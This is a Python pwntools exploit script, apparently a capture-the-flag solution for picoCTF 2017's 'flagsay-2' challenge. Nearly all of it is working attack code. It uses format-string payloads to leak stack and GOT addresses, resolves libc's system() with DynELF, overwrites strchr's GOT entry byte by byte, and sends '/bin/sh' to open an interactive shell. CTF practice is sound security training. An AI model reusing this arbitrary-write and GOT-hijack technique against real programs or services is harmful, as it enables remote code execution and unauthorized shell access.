#!/usr/bin/env python
#
#@author: GuilT

from pwn import *
import sys
import re

if len(sys.argv) > 1:
    conn = remote('shell2017.picoctf.com',18115)
else:
    conn = process('./flagsay-2')
    #gdb.attach(conn)


def exec_fmt(payload):
    global conn
    r = ''
    conn.sendline(payload)
    r = conn.recvuntil('\n //')
    return r

  
def setAddr(byte, tgt):
    #1 stage the address at (17)
    if byte >= 0x82:
        by = byte - 0x81
    else:
        by = 0x100 - 0x81 + byte
    payload = '%19${0}c%{1}$hhn'.format(by,tgt)
    exec_fmt(payload)
    
def leakTgt(tgt):
    #1 stage the address at (17)
    payload = '%{0}$p'.format(tgt)
    val = exec_fmt(payload)
    val = re.findall('\n             //(.*)                             /     \n', val, flags=re.DOTALL)[0]
    if '(nil)' in val:
        val = '0'
    return int(val,16)
    
def setAddr2(addr):
    addr = p32(addr)
    for i in range(len(addr)):
        setAddr(i, 17)
        setAddr(ord(addr[i]), 53)


leak1 = leakTgt(17)
leak2 = leakTgt(53) & 0xffffff00
fmtoffst = (leak2 - leak1)/4 + 53
log.info('fmtoffst = %d' % fmtoffst)

        
def leakAddr(addr):
    setAddr2(addr) 
    payload = '%{0}$s'.format(fmtoffst)
    val = exec_fmt(payload)
    val = re.findall('\n             //(.*)                             /     \n', val, flags=re.DOTALL)[0]
    if val == '':
        return '\x00'
    return val


strchrgot = 0x08049980 
libcstartmaingot = 0x08049988   

libcstartmainaddr = u32(leakAddr(libcstartmaingot)[:4])
log.success('libcstartmainaddr @ 0x%x' % libcstartmainaddr)

def writeWhatWhereSlow(what, where):
    setAddr2(where)
    what = p32(what)
    for i in range(len(what)):
        setAddr2(where + i)
        setAddr(ord(what[i]), fmtoffst)
    
    
d = DynELF(leakAddr, strchrgot)
systemaddr = d.lookup('system', 'libc')
log.success('systemaddr @ 0x%x' % systemaddr)


def writeWhatWhere(what, where):
    stackLeak = (leakTgt(53) & 0xffffff00) + 4
    #log.info('stackLeak = 0x%x' % stackLeak)
    for j in range(4):
        #log.info('0x%x <= 0x%x' % (stackLeak+j*4, where+j))
        writeWhatWhereSlow(where+j, stackLeak+j*4)
    
    what = p32(what)
    
    payload = ''
    written = 0x81
    for j in range(4):
        if ord(what[j]) > written:
            by = ord(what[j]) - written
        else:
            by = 0x100 - written + ord(what[j])
        written = (written + by) % 0x100
        payload += '%19${0}c%{1}$hhn'.format(by,fmtoffst+1+j)
        if j == 1 :
            payload += ' '*6
            written = (written + len('      /     \n' + ' '*12 + '//')) % 0x100
    exec_fmt(payload)
    
        
writeWhatWhere(systemaddr, strchrgot)

conn.sendline('/bin/sh')
 
conn.interactive()


quit()